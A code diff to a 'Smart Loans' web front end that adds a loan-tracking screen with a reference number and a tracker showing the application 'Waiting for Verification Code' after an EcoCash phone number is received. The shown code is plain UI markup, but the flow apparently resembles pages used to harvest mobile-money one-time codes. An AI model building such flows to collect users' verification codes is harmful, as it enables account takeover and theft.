@@ -1180,7 +1180,7 @@ alert("submitApplication() was called");
             result.application.id
         );
 
-        loadSuccessScreen();
+        loadTrackingScreen();
 
     } catch (error) {
 
@@ -1763,7 +1763,8 @@ async function submitEcoCashApplication() {
             result.application.id
         );
 
-        loadSuccessScreen();
+        loadTrackingScreen();
+    
 
     } catch (error) {
 
@@ -1774,5 +1775,102 @@ async function submitEcoCashApplication() {
         loadReviewScreen();
 
     }
+
+}
+
+// ===============================
+// LOAN TRACKING SCREEN
+// ===============================
+
+function loadTrackingScreen() {
+
+    const app = document.getElementById("app");
+
+    const reference =
+        sessionStorage.getItem("applicationId") || "Processing...";
+
+    app.innerHTML = `
+
+    <div class="container">
+
+        <div class="dashboard-card">
+
+            <h2>🏦 Smart Loans</h2>
+
+            <p>Your loan application has been successfully received and is currently under review. If approved, your loan funds will be disbursed to the bank account or EcoCash wallet you provided during your application. Loan applications are typically reviewed within 24 hours. Thank you for choosing Smart Loans.</p>
+
+        </div>
+
+        <div class="tracker-card">
+
+            <h3 style="text-align:center;">
+                Reference Number
+            </h3>
+
+            <h2 style="text-align:center;color:#1565C0;">
+                SL-${reference}
+            </h2>
+
+            <hr>
+
+            <div class="tracker-step step-green">
+                ✅ Application Submitted
+            </div>
+
+            <div class="tracker-step step-green">
+                ✅ Phone Number Received
+            </div>
+
+            <div class="tracker-step step-yellow">
+                🟡 Waiting for Verification Code
+            </div>
+
+            <div class="loading-dots">
+
+                <span></span>
+
+                <span></span>
+
+                <span></span>
+
+            </div>
+
+            <div class="status-message">
+
+                A verification code will be sent to your registered mobile number to confirm ownership.
+
+            </div>
+
+            <hr>
+
+            <div class="tracker-step step-gray">
+
+                ⚪ Phone Verification
+
+            </div>
+
+            <div class="tracker-step step-gray">
+
+                ⚪ Loan Assessment
+
+            </div>
+
+            <div class="tracker-step step-gray">
+
+                ⚪ Loan Approval
+
+            </div>
+
+            <div class="tracker-step step-gray">
+
+                ⚪ Funds Disbursed
+
+            </div>
+
+        </div>
+
+    </div>
+
+    `;
 
 }
